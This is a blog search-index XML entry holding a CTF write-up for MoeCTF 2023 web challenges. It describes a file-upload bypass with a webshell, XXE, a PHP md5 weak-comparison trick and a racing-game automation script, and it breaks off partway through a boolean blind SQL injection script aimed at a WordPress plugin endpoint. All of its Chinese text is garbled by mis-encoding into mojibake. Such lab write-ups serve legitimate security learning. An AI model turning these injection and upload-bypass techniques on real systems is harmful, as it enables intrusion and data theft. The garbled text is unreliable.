<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>MoeCTF 2023 Webéƒ¨åˆ†é¢˜è§£</title>
    <link href="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <url>/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="MoeCTF-Webéƒ¨åˆ†é¢˜è§£ï¼ˆå®åŠ›æœ‰é™ï¼‰"><a href="#MoeCTF-Webéƒ¨åˆ†é¢˜è§£ï¼ˆå®åŠ›æœ‰é™ï¼‰" class="headerlink" title="MoeCTF Webéƒ¨åˆ†é¢˜è§£ï¼ˆå®åŠ›æœ‰é™ï¼‰"></a>MoeCTF Webéƒ¨åˆ†é¢˜è§£ï¼ˆå®åŠ›æœ‰é™ï¼‰</h1><h2 id="1-http"><a href="#1-http" class="headerlink" title="1.http"></a>1.http</h2><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1-1.png" srcset="/img/loading.gif" lazyload><p>æ‰“å¼€åœ°å€å‘ç°ä»¥ä¸‹ä»»åŠ¡ï¼Œ</p><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1-2.png" srcset="/img/loading.gif" lazyload><p>BurpæŠ“ä¸€ä¸‹çœ‹çœ‹åŒ…çš„å†…å®¹ï¼Œ</p><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1-3.png" srcset="/img/loading.gif" lazyload><p>ä¿®æ”¹åŒ…çš„å†…å®¹å¦‚ä¸‹</p><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1-4.png" srcset="/img/loading.gif" lazyload><p>å›æ˜¾å¾—åˆ°flag</p><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/1-5.png" srcset="/img/loading.gif" lazyload><h2 id="2-Webå…¥é—¨æŒ‡åŒ—"><a href="#2-Webå…¥é—¨æŒ‡åŒ—" class="headerlink" title="2.Webå…¥é—¨æŒ‡åŒ—"></a>2.Webå…¥é—¨æŒ‡åŒ—</h2><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/2-1.png" srcset="/img/loading.gif" lazyload><p>è§£ç å³å¾—</p><h2 id="3-å½¼å²¸çš„flag"><a href="#3-å½¼å²¸çš„flag" class="headerlink" title="3.å½¼å²¸çš„flag"></a>3.å½¼å²¸çš„flag</h2><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/3-1.png" srcset="/img/loading.gif" lazyload><p>ç›´æ¥çœ‹æºç å¾—åˆ°flag</p><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/3-2.png" srcset="/img/loading.gif" lazyload><h2 id="4-cookie"><a href="#4-cookie" class="headerlink" title="4.cookie"></a>4.cookie</h2><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/4-1.png" srcset="/img/loading.gif" lazyload><p>æ ¹æ®é™„ä»¶ä¸­readmeçš„æç¤º</p><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/4-2.png" srcset="/img/loading.gif" lazyload><p>hackbarå‘é€postæ³¨å†Œç™»å½•è·å–flagå³å¯</p><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/4-3.png" srcset="/img/loading.gif" lazyload><h2 id="5-gas-gas-gas"><a href="#5-gas-gas-gas" class="headerlink" title="5.gas!gas!gas!"></a>5.gas!gas!gas!</h2><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/5-1.png" srcset="/img/loading.gif" lazyload><p>å¥½å¥½å¥½è¿™é¢˜æ„Ÿè§‰æ˜¯ç½‘ä¸å¥½è·‘ä¸å‡ºæ¥ã€‚ğŸ˜­</p><p>å†™ä¸ªè„šæœ¬ç›´æ¥è·‘å°±è¡Œã€‚æˆ‘è‡ªå·±çš„è„šæœ¬æ²¡è·‘å‡ºæ¥ï¼ˆè™½ç„¶æ„Ÿè§‰æ²¡å•¥é—®é¢˜ï¼‰ï¼Œç”¨åˆ«çš„å¸ˆå‚…è·‘å‡ºæ¥çš„è„šæœ¬è·‘çš„ä¹Ÿæ²¡è·‘å‡ºæ¥ã€‚</p><p>é™„1æˆ‘çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>s1=<span class="hljs-string">&quot;å¼¯é“ç›´è¡Œï¼Œä¿æŒè¿™ä¸ªé€Ÿåº¦&quot;</span><br>s2=<span class="hljs-string">&quot;å¼¯é“ç›´è¡Œï¼ŒæŠ“åœ°åŠ›å¤ªå°äº†ï¼&quot;</span><br>s3=<span class="hljs-string">&quot;å¼¯é“å‘å·¦ï¼Œä¿æŒè¿™ä¸ªé€Ÿåº¦&quot;</span><br>s4=<span class="hljs-string">&quot;å¼¯é“å‘å·¦ï¼ŒæŠ“åœ°åŠ›å¤ªå¤§äº†ï¼&quot;</span><br>s5=<span class="hljs-string">&quot;å¼¯é“å‘å³ï¼ŒæŠ“åœ°åŠ›å¤ªå¤§äº†ï¼&quot;</span><br><br>url=<span class="hljs-string">&quot;http://localhost:63648/&quot;</span><br><br>p= &#123;<br>    <span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<br>    <span class="hljs-string">&quot;steering_control&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<br>    <span class="hljs-string">&quot;throttle&quot;</span>:<span class="hljs-string">&quot;2&quot;</span><br>&#125;<br><br>r=requests.post(url,data=p)<br>session=r.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>)<br>session1=&#123;<span class="hljs-string">&quot;session&quot;</span>:session[<span class="hljs-number">8</span>:]&#125;<br>r1=r.text<br><span class="hljs-comment"># print(r1)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">if</span> r1[<span class="hljs-number">2308</span>:<span class="hljs-number">2320</span>].find(<span class="hljs-string">&quot;å¼¯é“å‘å·¦&quot;</span>)!=-<span class="hljs-number">1</span>:<br>        p[<span class="hljs-string">&quot;steering_control&quot;</span>]=<span class="hljs-string">&quot;1&quot;</span><br>    <span class="hljs-keyword">elif</span> r1[<span class="hljs-number">2308</span>:<span class="hljs-number">2320</span>].find(<span class="hljs-string">&quot;å¼¯é“å‘å³&quot;</span>)!=-<span class="hljs-number">1</span>:<br>        p[<span class="hljs-string">&quot;steering_control&quot;</span>]=<span class="hljs-string">&quot;-1&quot;</span><br>    <span class="hljs-keyword">else</span> :<br>        p[<span class="hljs-string">&quot;steering_control&quot;</span>]=<span class="hljs-string">&quot;0&quot;</span><br>    <span class="hljs-keyword">if</span> r1[<span class="hljs-number">2308</span>:<span class="hljs-number">2320</span>].find(<span class="hljs-string">&quot;æŠ“åœ°åŠ›å¤ªå¤§äº†&quot;</span>)!=-<span class="hljs-number">1</span>:<br>        p[<span class="hljs-string">&quot;throttle&quot;</span>] = <span class="hljs-string">&quot;2&quot;</span><br>    <span class="hljs-keyword">elif</span> r1[<span class="hljs-number">2308</span>:<span class="hljs-number">2320</span>].find(<span class="hljs-string">&quot;ä¿æŒè¿™ä¸ªé€Ÿåº¦&quot;</span>)!=-<span class="hljs-number">1</span>:<br>        p[<span class="hljs-string">&quot;throttle&quot;</span>] = <span class="hljs-string">&quot;1&quot;</span><br>    <span class="hljs-keyword">else</span> :<br>        p[<span class="hljs-string">&quot;throttle&quot;</span>] = <span class="hljs-string">&quot;0&quot;</span><br>    r=requests.post(url,data=p,cookies=session1)<br>    r1=r.text<br>    <span class="hljs-built_in">print</span>(r1)<br><span class="hljs-built_in">print</span>(r1)<br></code></pre></td></tr></table></figure><p>é™„2å…¶ä»–å¸ˆå‚…çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_info_from_html</span>(<span class="hljs-params">html</span>):<br>    soup = BeautifulSoup(html, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    info_div = soup.find(<span class="hljs-string">&#x27;div&#x27;</span>, &#123;<span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">&#x27;info&#x27;</span>&#125;)<br>    <span class="hljs-keyword">if</span> info_div:<br>        <span class="hljs-keyword">return</span> info_div.text<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_post_request</span>(<span class="hljs-params">steering_control, throttle, cookie=<span class="hljs-literal">None</span></span>):<br>    url = <span class="hljs-string">&quot;http://localhost:55523/&quot;</span><br><br>    headers = &#123;<br>        <span class="hljs-string">&quot;accept&quot;</span>: <span class="hljs-string">&quot;text/html&quot;</span>,<br>        <span class="hljs-string">&quot;content-type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>    &#125;<br><br>    data = &#123;<br>        <span class="hljs-string">&quot;driver&quot;</span>: <span class="hljs-string">&quot;Linmu&quot;</span>,<br>        <span class="hljs-string">&quot;steering_control&quot;</span>: steering_control,<br>        <span class="hljs-string">&quot;throttle&quot;</span>: throttle<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> cookie:<br>        headers[<span class="hljs-string">&quot;cookie&quot;</span>] = cookie<br><br>    response = requests.post(url, headers=headers, data=data, cookies=<span class="hljs-literal">None</span>)<br><br>    soup = BeautifulSoup(response.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    info_div = soup.find(<span class="hljs-string">&#x27;div&#x27;</span>, <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;info&#x27;</span>)<br>    content = info_div.get_text() <span class="hljs-keyword">if</span> info_div <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment"># è·å–æœåŠ¡ç«¯è¿”å›çš„ Set-Cookie å¤´éƒ¨å€¼</span><br>    server_cookie = response.headers.get(<span class="hljs-string">&#x27;Set-Cookie&#x27;</span>, <span class="hljs-literal">None</span>)<br><br>    <span class="hljs-keyword">return</span> content, server_cookie<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    &lt;select id=&quot;steering_control&quot; name=&quot;steering_control&quot; required=&quot;&quot;&gt;</span><br><span class="hljs-string">      &lt;option value=&quot;-1&quot;&gt;å·¦&lt;/option&gt;</span><br><span class="hljs-string">      &lt;option value=&quot;0&quot; selected=&quot;&quot;&gt;ç›´è¡Œ&lt;/option&gt;</span><br><span class="hljs-string">      &lt;option value=&quot;1&quot;&gt;å³&lt;/option&gt;</span><br><span class="hljs-string">    &lt;/select&gt;</span><br><span class="hljs-string">    &lt;select id=&quot;throttle&quot; name=&quot;throttle&quot; required=&quot;&quot;&gt;</span><br><span class="hljs-string">      &lt;option value=&quot;0&quot;&gt;æ¾å¼€&lt;/option&gt;</span><br><span class="hljs-string">      &lt;option value=&quot;1&quot;&gt;ä¿æŒ&lt;/option&gt;</span><br><span class="hljs-string">      &lt;option value=&quot;2&quot; selected=&quot;&quot;&gt;å…¨å¼€&lt;/option&gt;</span><br><span class="hljs-string">    &lt;/select&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>content, cookie = send_post_request(<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br><span class="hljs-built_in">print</span>(content)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;å¼¯é“å‘å³&quot;</span> <span class="hljs-keyword">in</span> content:<br>        steering_control = <span class="hljs-string">&quot;-1&quot;</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;å¼¯é“å‘å·¦&quot;</span> <span class="hljs-keyword">in</span> content:<br>        steering_control = <span class="hljs-string">&quot;1&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        steering_control = <span class="hljs-string">&quot;0&quot;</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;æŠ“åœ°åŠ›å¤ªå°äº†&quot;</span> <span class="hljs-keyword">in</span> content:<br>        throttle = <span class="hljs-string">&quot;0&quot;</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;æŠ“åœ°åŠ›å¤ªå¤§äº†&quot;</span> <span class="hljs-keyword">in</span> content:<br>        throttle = <span class="hljs-string">&quot;2&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        throttle = <span class="hljs-string">&quot;1&quot;</span><br><br>    content = send_post_request(steering_control, throttle, cookie)<br>    <span class="hljs-built_in">print</span>(content)<br></code></pre></td></tr></table></figure><h2 id="6-moeå›¾åºŠ"><a href="#6-moeå›¾åºŠ" class="headerlink" title="6.moeå›¾åºŠ"></a>6.moeå›¾åºŠ</h2><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/6-1.png" srcset="/img/loading.gif" lazyload><p>é˜…è¯»æºç å‘ç°jså¯¹å‰ç«¯æ–‡ä»¶ä¸Šä¼ ç±»å‹è¿›è¡Œäº†é™åˆ¶ï¼Œå¤„ç†æ˜¯äº¤ç»™äº†upload.phpã€‚</p><p>è®¿é—®upload.phpé˜…è¯»æºç </p><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/6-2.png" srcset="/img/loading.gif" lazyload><p>æºç ä¸­å¯¹content-typeè¿›è¡Œäº†æ£€æµ‹ï¼ŒæŠ“åŒ…æ”¹ä¸ºimage&#x2F;png</p><p>explodeå‡½æ•°æ˜¯æ ¹æ®ç¬¬ä¸€ä¸ªå‚æ•°å°†ç¬¬äºŒä¸ªå‚æ•°åˆ†ä¸ºæ•°ç»„</p><p>å¹¶ä¸”å‘ç°æºç ä¸­$secondSegment&#x3D;$fileNameParts[1]åªå¯¹æ•°ç»„ä¸­ç¬¬äºŒä½è¿›è¡Œæ£€æµ‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†æ–‡ä»¶åæ”¹ä¸º.png.phpå³å¯ç»•è¿‡ã€‚</p><p>ç›´æ¥åˆ é™¤ç›¸å…³éƒ¨åˆ†çš„jsï¼Œåœ¨æ§åˆ¶å°å¯¹å‡½æ•°è¿›è¡Œé‡æ–°å®šä¹‰ï¼Œå¹¶ä¸Šä¼ æœ¨é©¬ã€‚</p><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/6-3.png" srcset="/img/loading.gif" lazyload><p>å›æ˜¾å¾—åˆ°æ–‡ä»¶ä½ç½®ï¼ˆå½“å‰ç›®å½•ä¸ºhtmlï¼‰</p><p>èšå‰‘è¿æ¥ä¸€ä¸‹å¾—åˆ°flag</p><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/6-4.png" srcset="/img/loading.gif" lazyload><h2 id="7-äº†è§£ä½ çš„åº§é©¾"><a href="#7-äº†è§£ä½ çš„åº§é©¾" class="headerlink" title="7.äº†è§£ä½ çš„åº§é©¾"></a>7.äº†è§£ä½ çš„åº§é©¾</h2><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/7-1.png" srcset="/img/loading.gif" lazyload><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/7-2.png" srcset="/img/loading.gif" lazyload><p>éšä¾¿è®¿é—®ä¸€è¾†è½¦ï¼ŒæŠ“åŒ…çœ‹ä¸€ä¸‹åŒ…çš„å†…å®¹</p><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/7-3.png" srcset="/img/loading.gif" lazyload><p>å‘ç°æœ‰xmlå­—æ ·,çŒœæµ‹ä¸ºxmlå¤–éƒ¨å®ä½“æ³¨å…¥</p><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/7-4.png" srcset="/img/loading.gif" lazyload><p>urlç¼–ç åæ‰”å›Burpï¼Œå‘åŒ…å¾—åˆ°flag</p><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/7-5.png" srcset="/img/loading.gif" lazyload><h2 id="8-meoå›¾åºŠ"><a href="#8-meoå›¾åºŠ" class="headerlink" title="8.meoå›¾åºŠ"></a>8.meoå›¾åºŠ</h2><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/8-1.png" srcset="/img/loading.gif" lazyload><p>çœ‹ç€å’Œmeoå›¾åºŠå¾ˆåƒå•Šï¼Œè¯»ä¸€ä¸‹upload.phpä¸ç»™è¯»äº†ã€‚</p><p>å…ˆä¼ ä¸ªæ­£å¸¸å›¾ç‰‡çœ‹çœ‹å§ã€‚</p><p>æŸ¥çœ‹åè§‚å¯Ÿåˆ°urlå¸¦äº†å‚æ•°</p><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/8-2.png" srcset="/img/loading.gif" lazyload><p>é‚£è¯•è¯•èƒ½ä¸èƒ½ç›´æ¥è¯»flag</p><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/8-3.png" srcset="/img/loading.gif" lazyload><p>çœ‹åˆ°å›æ˜¾æœ‰ä¸ªFl3g_n0t_Here_dont_peek!!!!!.php</p><p>çœ‹çœ‹æœ‰ä»€ä¹ˆ</p><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/8-4.png" srcset="/img/loading.gif" lazyload><p>md5å€¼çš„æ¯”è¾ƒï¼Œå› ä¸º&#x3D;&#x3D;å¼±ç›¸ç­‰ï¼Œæ‰€ä»¥åªè¦å­—ç¬¦ä¸²å¼€å¤´æ•°å­—éƒ¨åˆ†ç›¸ç­‰å³å¯ã€‚</p><p>éšä¾¿æ‰¾ä¸¤ä¸ªmd5åå€¼ä¸º0å¼€å¤´çš„æ‰”è¿›å»å¾—åˆ°flag</p><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/8-5.png" srcset="/img/loading.gif" lazyload><h2 id="9-å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·"><a href="#9-å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·" class="headerlink" title="9.å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·"></a>9.å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·</h2><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/9-1.png" srcset="/img/loading.gif" lazyload><p>è¿›å…¥wordpressåæ³¨æ„åˆ°å³ä¾§æ¥è®¿è€…å°ç™»è®°</p><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/9-2.png" srcset="/img/loading.gif" lazyload><p>å‘ç°æºç ä¸­jså°†ä»apiè·å–çš„æ•°æ®å‘å‘äº†wp-content&#x2F;plugins&#x2F;visitor-logging&#x2F;logger.php</p><p>è®¿é—®ä¸€ä¸‹</p><img src="/2023/09/18/MoeCTF-2023-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/9-3.png" srcset="/img/loading.gif" lazyload><p>å¾ˆæ˜æ˜¾å°±æ˜¯sqlæ³¨å…¥äº†,ä»timeå…¥æ‰‹ã€‚</p><p>æ ¹æ®å›æ˜¾æ•°æ®æ’å…¥æˆåŠŸæˆ–å¤±è´¥è¿›è¡Œå¸ƒå°”ç›²æ³¨</p><p>ç¼–å†™è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php&quot;</span><br>p=&#123;<br>    <span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">&quot;111&quot;</span>,<br>    <span class="hljs-string">&quot;user_agent&quot;</span>:<span class="hljs-string">&quot;111&quot;</span>,<br>    <span class="hljs-string">&quot;time&quot;</span>:<span class="hljs-string">&quot;222 and length(database())=&#123;&#125;&quot;</span><br>&#125;<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getTime</span>(<span class="hljs-params">url,p</span>):<br>    <span class="hljs-keyword">try</span>:<br>        res = requests.post(url = url,data=p,timeout=<span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;timeout&quot;</span><br>    <span class="hljs-keyword">return</span> res.text<br><br><span class="hljs-comment"># for i in range(30):</span><br><span class="hljs-comment">#     p = &#123;</span><br><span class="hljs-comment">#         &quot;ip&quot;: &quot;111&quot;,</span><br><span class="hljs-comment">#         &quot;user_agent&quot;: &quot;111&quot;,</span><br><span class="hljs-comment">#         &quot;time&quot;: f&quot;null and length(database())=&#123;i&#125;)#&quot;</span><br><span class="hljs-comment">#     &#125;</span><br><span class="hljs-comment">#     r = requests.post(url, data=p)</span><br><span class="hljs-comment">#     r1=r.text</span><br><span class="hljs-comment">#     print(r1)</span><br><span class="hljs-comment">#     print(r1.count(&quot;æˆåŠŸ&quot;))</span><br><span class="hljs-comment">#     if r1.count(&quot;æˆåŠŸ&quot;)==4:</span><br><span class="hljs-comment">#         print(i)</span><br><span class="hljs-comment">#         break</span><br><br><br><span class="hljs-comment"># for j in range(1000):</span><br><span class="hljs-comment">#     str1=&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&amp;*.&quot;</span><br><span class="hljs-comment">#     for k in str1:</span><br><span class="hljs-comment">#         p = &#123;</span><br><span class="hljs-comment">#             &quot;ip&quot;: &quot;111&quot;,</span><br><span class="hljs-comment">#             &quot;user_agent&quot;: &quot;111&quot;,</span><br><span class="hljs-comment">#             &quot;time&quot;: f&quot;null and substr(database(),&#123;j&#125;,1)=&#x27;&#123;k&#125;&#x27;)#&quot;</span><br><span class="hljs-comment">#         &#125;</span><br><span class="hljs-comment">#         r = requests.post(url, data=p)</span><br><span class="hljs-comment">#         r1 = r.text</span><br><span class="hljs-comment">#         if r1.count(&quot;æˆåŠŸ&quot;) == 4:</span><br><span class="hljs-comment">#             print(k)</span><br><span class="hljs-comment">#             break</span><br><br><span class="hljs-comment"># for i in range(300):</span><br><span class="hljs-comment">#     p = &#123;</span><br><span class="hljs-comment">#         &quot;ip&quot;: &quot;111&quot;,</span><br><span class="hljs-comment">#         &quot;user_agent&quot;: &quot;111&quot;,</span><br><span class="hljs-comment">#         &quot;time&quot;: f&quot;null and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=&#123;i&#125;)#&quot;</span><br><span class="hljs-comment">#     &#125;</span><br><span class="hljs-comment">#     r = requests.post(url, data=p)</span><br><span class="hljs-comment">#     r1=r.text</span><br><span class="hljs-comment">#     if r1.count(&quot;æˆåŠŸ&quot;)==4:</span><br><span class="hljs-comment">#         print(i,end=&#x27;&#x27;)</span><br><span class="hljs-comment">#         break</span><br><br><span class="hljs-comment"># for j in range(1,206):</span><br><span class="hljs-comment">#     str1=&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&amp;*.&quot;</span><br><span class="hljs-comment">#     for k in str1:</span><br><span class="hljs-comment">#         p = &#123;</span><br><span class="hljs-comment">#             &quot;ip&quot;: &quot;111&quot;,</span><br><span class="hljs-comment">#             &quot;user_agent&quot;: &quot;111&quot;,</span><br><span class="hljs-comment">#             &quot;time&quot;: f&quot;null and substr((select group_concat(column_name) from information_schema.columns where 